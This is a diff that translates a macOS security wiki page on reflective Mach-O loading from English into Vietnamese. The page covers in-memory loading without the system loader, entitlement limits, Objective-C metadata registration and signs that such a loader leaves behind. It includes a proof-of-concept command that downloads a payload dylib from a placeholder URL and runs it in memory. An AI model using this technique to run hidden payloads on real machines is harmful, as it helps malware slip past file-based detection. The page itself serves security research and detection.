@@ -1,30 +1,30 @@
-# Reflective Mach-O Loading on macOS
+# Reflective Mach-O Loading trên macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-A reflective loader maps a Mach-O image from bytes already in its own process, then links it and runs its initializers without asking the system loader to open a payload file. This is **in-process code execution**, not a privilege escalation or remote-process injection primitive.<sup>[[2]](#references)</sup>
+Reflective loader ánh xạ một image Mach-O từ các byte đã có trong process của chính nó, sau đó liên kết image và chạy các initializer mà không yêu cầu system loader mở file payload. Đây là **thực thi code trong process**, không phải primitive leo thang đặc quyền hay injection vào process từ xa.<sup>[[2]](#references)</sup>
 
-On recent macOS, the old `NSCreateObjectFileImageFromMemory`/`NSLinkModule` path writes the image to disk. ReflectiveLoader instead embeds older Apple dyld loading code; Wardle demonstrated this on macOS 15 and 26.<sup>[[2]](#references)[[3]](#references)</sup>
+Trên các phiên bản macOS gần đây, đường dẫn cũ `NSCreateObjectFileImageFromMemory`/`NSLinkModule` ghi image xuống đĩa. ReflectiveLoader thay vào đó nhúng code loading dyld cũ của Apple; Wardle đã chứng minh cách này hoạt động trên macOS 15 và 26.<sup>[[2]](#references)[[3]](#references)</sup>
 
-If the loader uses the Hardened Runtime, its unsigned in-memory code needs an executable-memory exception such as `com.apple.security.cs.allow-unsigned-executable-memory` or `com.apple.security.cs.disable-executable-page-protection`; otherwise execution is blocked by code-signing enforcement. This is a loader signing constraint, not an elevation primitive. See the [macOS entitlements reference](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>
+Nếu loader dùng Hardened Runtime, code unsigned trong bộ nhớ cần một ngoại lệ cho executable memory, chẳng hạn `com.apple.security.cs.allow-unsigned-executable-memory` hoặc `com.apple.security.cs.disable-executable-page-protection`; nếu không, việc thực thi sẽ bị code-signing enforcement chặn. Đây là ràng buộc về signing của loader, không phải primitive nâng quyền. Xem [tài liệu tham khảo về macOS entitlements](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>
 
-For the PoC, supply a URL serving a raw Mach-O **bundle, framework, or dylib**. Its `main.mm` rejects empty downloads and states that payloads using `LC_DYLD_CHAINED_FIXUPS` are unsupported. A local pathname is also accepted, but that input is not a fileless workflow. The URL form reads bytes into `NSData` and passes its buffer and length to `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>
+Để chạy PoC, cung cấp URL phục vụ một **bundle, framework hoặc dylib** Mach-O thô. `main.mm` từ chối các lượt tải xuống rỗng và cho biết payload dùng `LC_DYLD_CHAINED_FIXUPS` không được hỗ trợ. Chấp nhận cả pathname cục bộ, nhưng cách nhập này không phải quy trình không dùng file. Dạng URL đọc các byte vào `NSData` rồi truyền buffer cùng độ dài của nó cho `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>
 
 ```bash
 ./PoC 'https://example.invalid/payload.dylib'
 ```
 
-The embedded loader calls `ImageLoaderMachO::instantiateFromMemory`, then `image->link`. It registers Objective-C metadata **after linking but before** `image->runInitializers`, which executes constructors.<sup>[[5]](#references)</sup> Without registration, a constructor that sends an Objective-C message can fail with `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> See [dyld's normal image-loading flow](macos-library-injection/macos-dyld-process.md#flow) and the [Mach-O sections reference](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).
+Embedded loader gọi `ImageLoaderMachO::instantiateFromMemory`, sau đó là `image->link`. Nó đăng ký metadata Objective-C **sau khi linking nhưng trước** `image->runInitializers`, thao tác này thực thi các constructor.<sup>[[5]](#references)</sup> Nếu không đăng ký, constructor gửi thông điệp Objective-C có thể gặp lỗi `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Xem [luồng tải image thông thường của dyld](macos-library-injection/macos-dyld-process.md#flow) và [tài liệu tham khảo về các section Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).
 
-## Activating Objective-C metadata
+## Kích hoạt metadata Objective-C
 
-Unlike normal dyld loading, embedding the older image loader does not automatically make the payload's Objective-C metadata usable by `libobjc`.<sup>[[3]](#references)</sup> The adapted LLVM JIT approach scans the mapped `__DATA` and `__DATA_CONST` Objective-C sections, then performs these steps before constructors run:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+Không giống như quá trình tải thông thường của dyld, việc nhúng image loader cũ hơn không tự động khiến metadata Objective-C của payload có thể được `libobjc` sử dụng.<sup>[[3]](#references)</sup> Cách tiếp cận LLVM JIT đã điều chỉnh quét các section Objective-C trong `__DATA` và `__DATA_CONST` đã được ánh xạ, rồi thực hiện các bước sau trước khi chạy constructor:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
 
-1. Walk `__objc_selrefs` in `sizeof(SEL)` steps. Obtain each non-null selector's name with `sel_getName`, pass it to `sel_registerName`, and replace the section's pointer with the canonical `SEL`.
-2. Collect classes from `__objc_classlist` and register them with `objc_readClassPair`, resolving superclass dependencies first.
-3. Rewrite references in `__objc_classrefs` and `__objc_superrefs` to registered classes or metaclasses, and attach category methods from `__objc_catlist`.
+1. Duyệt `__objc_selrefs` theo từng bước `sizeof(SEL)`. Lấy tên của mỗi selector khác null bằng `sel_getName`, truyền tên đó cho `sel_registerName`, rồi thay con trỏ trong section bằng `SEL` chuẩn.
+2. Thu thập các class từ `__objc_classlist` và đăng ký chúng bằng `objc_readClassPair`, đồng thời phân giải các phụ thuộc superclass trước.
+3. Viết lại các tham chiếu trong `__objc_classrefs` và `__objc_superrefs` thành các class hoặc metaclass đã đăng ký, đồng thời gắn các phương thức category từ `__objc_catlist`.
 
-For example, the selector repair in `ObjCRuntime.cpp` is equivalent to:<sup>[[6]](#references)</sup>
+Ví dụ, phần sửa selector trong `ObjCRuntime.cpp` tương đương với:<sup>[[6]](#references)</sup>
 
 ```objectivec
 for (uint8_t *cursor = sectionStart;
@@ -36,15 +36,15 @@ for (uint8_t *cursor = sectionStart;
 }
 ```
 
-The PoC relies on internal Objective-C runtime behavior and does not support every Mach-O format feature, so its registration code is an implementation reference rather than a generic drop-in loader.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Registration is needed for referenced Apple classes and methods as well as classes defined by the payload.<sup>[[3]](#references)</sup>
+PoC dựa vào hành vi nội bộ của Objective-C runtime và không hỗ trợ mọi tính năng của định dạng Mach-O, vì vậy mã đăng ký chỉ là tài liệu tham khảo về cách triển khai chứ không phải loader dùng chung có thể thay thế trực tiếp.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Cần đăng ký cả các class và method của Apple được tham chiếu lẫn các class do payload định nghĩa.<sup>[[3]](#references)</sup>
 
-A reflectively loaded image does not appear in `dyld_all_image_infos` in the author's tests. Its anonymous executable mappings can instead appear as unnamed `dylib` regions in `vmmap`; sampled frames can be shown as `<unknown binary>`. These are inspection clues rather than a reliable attribution to this loader, and access to another process's task information is entitlement-limited. See [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) for process-access constraints.<sup>[[3]](#references)</sup>
+Trong các thử nghiệm của tác giả, image được nạp reflective không xuất hiện trong `dyld_all_image_infos`. Thay vào đó, các vùng nhớ thực thi vô danh có thể xuất hiện dưới dạng vùng `dylib` không tên trong `vmmap`; các frame được lấy mẫu có thể hiển thị là `<unknown binary>`. Đây là những manh mối để kiểm tra, không phải căn cứ đáng tin cậy để quy kết cho loader này; quyền truy cập thông tin task của một tiến trình khác bị giới hạn bởi entitlement. Xem [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) để biết các giới hạn khi truy cập tiến trình.<sup>[[3]](#references)</sup>
 
 ## References
 
-- [1] [LLVM JIT, Objective-C and Swift on macOS: knowledge dump](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
-- [2] [Restoring Reflective Code Loading on macOS (Part I)](https://objective-see.org/blog/blog_0x7C.html)
-- [3] [Restoring Reflective Code Loading on macOS (Part II)](https://objective-see.org/blog/blog_0x82.html)
+- [1] [LLVM JIT, Objective-C và Swift trên macOS: tổng hợp kiến thức](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
+- [2] [Khôi phục Reflective Code Loading trên macOS (Phần I)](https://objective-see.org/blog/blog_0x7C.html)
+- [3] [Khôi phục Reflective Code Loading trên macOS (Phần II)](https://objective-see.org/blog/blog_0x82.html)
 - [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
 - [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
 - [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
